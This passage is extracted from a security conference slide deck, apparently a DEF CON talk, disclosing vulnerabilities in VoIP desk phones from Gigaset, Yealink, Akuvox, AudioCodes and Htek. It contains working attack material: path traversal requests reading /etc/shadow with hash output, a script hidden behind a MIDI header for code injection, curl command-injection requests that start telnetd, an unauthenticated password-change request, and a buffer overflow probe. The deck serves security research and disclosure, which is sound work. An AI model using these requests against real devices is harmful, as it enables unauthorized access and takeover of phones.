return getCodeMess('session', 'admlog');
return getCodeMess('session', 'admerr');
 Information leak
Web Based Findings – Gigaset Maxwell Basic
60
GET http://gigaset.voip/Parameters
Admin logged in?
Yes
No
Using  the 
Web-Interface
Traffic Analysis
return getCodeMess('session', 'admlog');
return getCodeMess('session', 'admerr');
 Information leak
 Information leak
Web Based Findings – Gigaset Maxwell Basic
61
Admin logged in?
Yes
No
Using  the 
Web-Interface
Traffic Analysis
¯\_(ツ)_/¯ 
Not that bad, right ?
Web Based Findings – Gigaset Maxwell Basic
62
function sessInfo()
{
$token = GetSessionToken();
$session = new sessionmanager();
if ($session->getCurrentLoginUser() == USER_ADMIN 
&& $token != $session->getToken())
{
return getCodeMess('session', 'admlog');
}
else
{
return getCodeMess('session', 'sesserr');
}
}
Web Based Findings – Gigaset Maxwell Basic
63
Admin
Logging in
Generate Session Token
Session Token
DB
Web Based Findings – Gigaset Maxwell Basic
64
Logging in
Generate Session Token
Session Token
DB
Send invalid
Session Token
Admin
Web Based Findings – Gigaset Maxwell Basic
65
Logging in
Generate Session Token
Session Token
DB
Send invalid
Session Token
if ($session->getCurrentLoginUser() == USER_ADMIN 
&& $token != $session->getToken())
Admin
 Digging deeper
Web Based Findings – Gigaset Maxwell Basic
66
Firmware 
Extraction
php file 
investigation
function POST_State()
{
$session = new sessionmanager;
$token = GetSessionToken();
$userID = $session->verifySession($token);
if ($userID)
{
// Do Something here
}
}
 Digging deeper
Web Based Findings – Gigaset Maxwell Basic
67
Firmware 
Extraction
php file 
investigation
 Digging deeper
Web Based Findings – Gigaset Maxwell Basic
68
Firmware 
Extraction
php file 
investigation
function POST_State()
{
$session = new sessionmanager;
$token = GetSessionToken();
$userID = $session->verifySession($token);
if ($userID)
{
// Do Something here
}
}
 Digging deeper
Web Based Findings – Gigaset Maxwell Basic
69
Firmware 
Extraction
php file 
investigation
function POST_State()
{
$session = new sessionmanager;
$token = GetSessionToken();
$userID = $session->verifySession($token);
if ($userID)
{
// Do Something here
}
}
 Digging even deeper
Web Based Findings – Gigaset Maxwell Basic
70
Firmware 
Extraction
php file 
investigation
function POST_Parameters()
{
$session = new sessionmanager;
$token = GetSessionToken();
$userID = $session->verifySession($token);
$nvm = new settingscontroller();
$req = array();
$reqarr = json_decode(file_get_contents('php://input'));
foreach ($reqarr as $key => $value)
{
$req[$key] = $value;
}
$nvm->settingsCheckAccessParams($req);
if ($nvm->settingsSaveMultiValue($req) == true)
{
 Digging even deeper
Web Based Findings – Gigaset Maxwell Basic
71
Firmware 
Extraction
php file 
investigation
function POST_Parameters()
{
$session = new sessionmanager;
$token = GetSessionToken();
$userID = $session->verifySession($token);
$nvm = new settingscontroller();
$req = array();
$reqarr = json_decode(file_get_contents('php://input'));
foreach ($reqarr as $key => $value)
{
$req[$key] = $value;
}
$nvm->settingsCheckAccessParams($req);
if ($nvm->settingsSaveMultiValue($req) == true)
{
 Digging even deeper
Web Based Findings – Gigaset Maxwell Basic
72
Firmware 
Extraction
php file 
investigation
Returns 0 as attacker does not know current 
session token
function POST_Parameters()
{
$session = new sessionmanager;
$token = GetSessionToken();
$userID = $session->verifySession($token);
$nvm = new settingscontroller();
$req = array();
$reqarr = json_decode(file_get_contents('php://input'));
foreach ($reqarr as $key => $value)
{
$req[$key] = $value;
}
$nvm->settingsCheckAccessParams($req);
if ($nvm->settingsSaveMultiValue($req) == true)
{
 Digging even deeper
Web Based Findings – Gigaset Maxwell Basic
73
Firmware 
Extraction
php file 
investigation
Returns 0 as attacker does not know current 
session token
Change it anyway
Demo
74
Demo Time
Path Traversal
75
GET http://voip.phone/cmd.bin?file=defcon.txt
Send content of: defcon.txt
Path Traversal
76
GET http://voip.phone/cmd.bin?file=defcon.txt
Send content of: defcon.txt
GET http://voip.phone/cmd.bin?file=
../../../../../etc/passwd
Send content of: ../../../../../etc/passwd
Send content of: /etc/passwd
Path Traversal - Yealink T41S
77
POST http://10.148.207.216/servlet?m=mod_data&p=network-diagnosis
&q=getinfo&Rajax=0.5174477889842097 HTTP/1.1
Proxy-Connection: keep-alive
Content-Length: 53
Origin: http://10.148.207.216
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 
(KHTML, like Gecko) Chrome/64.0.3282.24 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Referer: http://10.148.207.216/servlet?m=mod_data&p=network-diagnosis&q=load
Accept-Language: en-gb
Cookie: JSESSIONID=3b73d6390697f50
Host: 10.148.207.216
file=../../../../../../../etc/shadow&token=42423833540d4e990
Path Traversal - Yealink T41S
78
Response:
root:$1$.jKlhz1B$/Nmgj2klrsZk3cYc1BLUR/:11876:0:99999:7:::
toor:$1$5sa7xxqo$eV4t7Nb1tPqjOWT1s3/ks1:11876:0:99999:7:::
 Instead of network diagnostics: /etc/shadow
Ringtone Code Injection
79
 Ringtone file upload provides an attack surface for uploading “code” to 
execute
 Path traversal vulnerability would allow to write to arbitrary folder and 
overwrite a privileged script
 Problem, script is not an audio file, how to bypass content verification ?
Filename: ../../../etc/init.d/OperaEnv.sh
Ringtone Code Injection
80
 Ringtone file upload provides an attack surface for uploading “code” to 
execute
 Path traversal vulnerability would allow to write to arbitrary folder and 
overwrite a privileged script
 Problem, script is not an audio file, how to bypass content verification ?
Filename: ../../../etc/init.d/OperaEnv.sh
Ringtone Code Injection
81
 Software verifies file, but only header
Ringtone Code Injection
82
 Software verifies file, but only header
MThd..........MTrk...3...
...2009.11.01...
......@.e...T.!......Q....../.
#!/bin/sh
echo "New Script for changing password!"
echo "Sourcing Opera Environment...“
…
MIDI file header
each line „invalid command“
script code
Ringtone Code Injection
83
 Software verifies file, but only header
 Whole file will be interpreted as script, after passing header 
verification!
MThd..........MTrk...3...
...2009.11.01...
......@.e...T.!......Q....../.
#!/bin/sh
echo "New Script for changing password!"
echo "Sourcing Opera Environment...“
…
MIDI file header
each line „invalid command“
script code
84
Backdoor ?!
Running Services
85
 Portscan of Akuvox device:
Starting Nmap 7.01 ( https://nmap.org ) at 2019-07-26 11:20 CEST
Initiating Ping Scan at 11:20Scanning 10.148.207.221 [2 ports]
...
Host is up (0.014s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
23/tcp
open  telnet
80/tcp
open  http
443/tcp open  https
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.00 seconds
huber@pc-huberlap:~$ 
Telnet running
Problem!
86
 The running telnet service can not be turned off !
 The firmware image is not public available, 
Problem!
87
 The running telnet service can not be turned off !
 The firmware image is not public available, but we dumped it
 Hashes are DES crypt protected  max pass length = 8 
 On my old GPU it took around 30 days to crack it 
huber@pc-huber:/akuvox/squashfs-root/etc$ cat shadow 
root:pVjvZpycBR0mI:10957:0:99999:7:::
admin:UCX0aARNR9jK6:10957:0:99999:7:::
88
Command INjection
Command Injection
89
IP:
x
Web Interface
Ping
Command Injection
90
…
sprintf(buffer, "ping %s -c 4", ip);
system(buffer);
…
POST:
Ip=127.0.0.1 
IP:
x
Web Interface
Ping
127.0.0.1
Webserver
•
Server app
•
CGI script
…
127.0.0.1
Command Injection
91
…
sprintf(buffer, "ping %s -c 4", ip);
system(buffer);
…
POST:
Ip=127.0.0.1 
system("ping 127.0.0.1 –c 4");
// do four pings
IP:
x
Web Interface
Ping
127.0.0.1
Webserver
•
Server app
•
CGI script
…
127.0.0.1
Command Injection
92
IP:
x
Web Interface
Ping
127.0.0.1 –c 0; ls ;#
127.0.0.1 –c 0; ls ;#
ping counter
exec ls
start comment
Command Injection
93
…
sprintf(buffer, "ping %s -c 4", ip);
system(buffer);
…
POST:
Ip=127.0.0.1 –c 0; ls ;#
IP:
x
Web Interface
Ping
127.0.0.1 –c 0; ls ;#
Webserver
•
Server app
•
CGI script
…
127.0.0.1 –c 0; ls ;#
127.0.0.1 –c 0; ls ;#
ping counter
exec ls
start comment
Command Injection
94
…
sprintf(buffer, "ping %s -c 4", ip);
system(buffer);
…
POST:
Ip=127.0.0.1 –c 0; ls ;#
system("ping 127.0.0.1 –c 0; ls ;# –c 4");
// do zero ping, exec ls command, comment
IP:
x
Web Interface
Ping
127.0.0.1 –c 0; ls ;#
Webserver
•
Server app
•
CGI script
…
127.0.0.1 –c 0; ls ;#
127.0.0.1 –c 0; ls ;#
ping counter
exec ls
start comment
Command Injection
95
 Command injection in AudioCodes 405HD device:
curl -i -s -k -X 'GET' \
-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) …
-H 'Accept: */*' -H 'Accept-Language: en-GB,en;q=0.5' 
-H 'Referer: http://10.148.207.249/mainform.cgi/Monitoring.htm' 
-H 'Authorization: Basic YWRtaW46c3VwZXJwYXNz' –H 'Connection: keep-alive' -H '' \
'http://10.148.207.249/command.cgi?ping%20-c%204%20127.0.0.1;/usr/sbin/telnetd'
idea, start telnetd
Command Injection
96
 Command injection in AudioCodes 405HD device:
curl -i -s -k -X 'GET' \
-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) …
-H 'Accept: */*' -H 'Accept-Language: en-GB,en;q=0.5' 
-H 'Referer: http://10.148.207.249/mainform.cgi/Monitoring.htm' 
-H 'Authorization: Basic YWRtaW46c3VwZXJwYXNz' –H 'Connection: keep-alive' -H '' \
'http://10.148.207.249/command.cgi?ping%20-c%204%20127.0.0.1;/usr/sbin/telnetd'
idea, start telnetd
Attacker does not know credentials
Command Injection
97
 Command injection in AudioCodes 405HD device:
 Can we bypass the authorization?
curl -i -s -k -X 'GET' \
-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) …
-H 'Accept: */*' -H 'Accept-Language: en-GB,en;q=0.5' 
-H 'Referer: http://10.148.207.249/mainform.cgi/Monitoring.htm' 
-H 'Authorization: Basic YWRtaW46c3VwZXJwYXNz' –H 'Connection: keep-alive' -H '' \
'http://10.148.207.249/command.cgi?ping%20-c%204%20127.0.0.1;/usr/sbin/telnetd'
idea, start telnetd
Attacker does not know credentials
Command Injection
98
 Command injection in AudioCodes 405HD device:
 Can we bypass the authorization?
curl -i -s -k -X 'GET' \
-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) …
-H 'Accept: */*' -H 'Accept-Language: en-GB,en;q=0.5' 
-H 'Referer: http://10.148.207.249/mainform.cgi/Monitoring.htm' 
-H 'Authorization: Basic YWRtaW46c3VwZXJwYXNz' –H 'Connection: keep-alive' -H '' \
'http://10.148.207.249/command.cgi?ping%20-c%204%20127.0.0.1;/usr/sbin/telnetd'
idea, start telnetd
Attacker does not know credentials
NOPE !
Exploit for Auth Bypass
99
 But look at “Change password” request:
curl -i -s -k -X
'POST'
\
-H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0)
Gecko/20100101 Firefox/39.0' 
-H 'Pragma: no-cache' -H 'Cache-Control: no-cache' 
-H 'Content-Type: application/x-www-form-urlencoded' -H 'Content-Length: 33' 
-H 'Referer:http://10.148.207.249/mainform.cgi/System_Auth.htm' -H '' \
--data-binary $'NADMIN=admin&NPASS=pass&NCPASS=pass' \
'http://10.148.207.249/mainform.cgi/System_Auth.htm'
Exploit for Auth Bypass
100
 But look at “Change password” request:
 NO Authorization header!
 NO old password parameter!
curl -i -s -k -X
'POST'
\
-H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0)
Gecko/20100101 Firefox/39.0' 
-H 'Pragma: no-cache' -H 'Cache-Control: no-cache' 
-H 'Content-Type: application/x-www-form-urlencoded' -H 'Content-Length: 33' 
-H 'Referer:http://10.148.207.249/mainform.cgi/System_Auth.htm' -H '' \
--data-binary $'NADMIN=admin&NPASS=pass&NCPASS=pass' \
'http://10.148.207.249/mainform.cgi/System_Auth.htm'
Exploit for Auth Bypass
101
 But look at “Change password” request:
 NO Authorization header!
 NO old password parameter!
curl -i -s -k -X
'POST'
\
-H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0)
Gecko/20100101 Firefox/39.0' 
-H 'Pragma: no-cache' -H 'Cache-Control: no-cache' 
-H 'Content-Type: application/x-www-form-urlencoded' -H 'Content-Length: 33' 
-H 'Referer:http://10.148.207.249/mainform.cgi/System_Auth.htm' -H '' \
--data-binary $'NADMIN=admin&NPASS=pass&NCPASS=pass' \
'http://10.148.207.249/mainform.cgi/System_Auth.htm'
102
 DEMO
Demo Time
Inside Outside
103
 Internal attacker -> entry point
 csrf
 Open to internet -> Shodan map
 Default creds
End technical part
Shit Happens !
Stack Based Buffer Overflow (MIPS)
104
 Request changing password on Htek - UC902:
curl -i -s -k -X 'GET'
… -H 'Authorization: Basic YWRtaW46YWRtaW4=' –H … -H ''
'http://192.168.2.107/hl_web/cgi_command=setSecurityPasswortaaaabaaacaaadaaaeaaafaaagaaahaaaia
aajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabg'
Stack Based Buffer Overflow (MIPS)
105
 Request changing password on Htek - UC902:
 Internal code:
curl -i -s -k -X 'GET'
… -H 'Authorization: Basic YWRtaW46YWRtaW4=' –H … -H ''
'http://192.168.2.107/hl_web/cgi_command=setSecurityPasswortaaaabaaacaaadaaaeaaafaaagaaahaaaia
aajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabg'
handle_cgi_command(undefined4 param_1, undefined4 param_2, undefined4 param_3, char *cgi_param) {
char targetBuffer [32];
…
memset(targetBuffer,0,0x20);
iVar1 = strncmp(cgi_param, "/hl_web/cgi_command=", 0x14); 
if (iVar1 == 0) {
CopyToCommandStr(targetBuffer, cgi_param + 0x14);
...
Stack Based Buffer Overflow (MIPS)
106
 Request changing password on Htek - UC902:
 Internal code:
curl -i -s -k -X 'GET'
… -H 'Authorization: Basic YWRtaW46YWRtaW4=' –H … -H ''
'http://192.168.2.107/hl_web/cgi_command=setSecurityPasswortaaaabaaacaaadaaaeaaafaaagaaahaaaia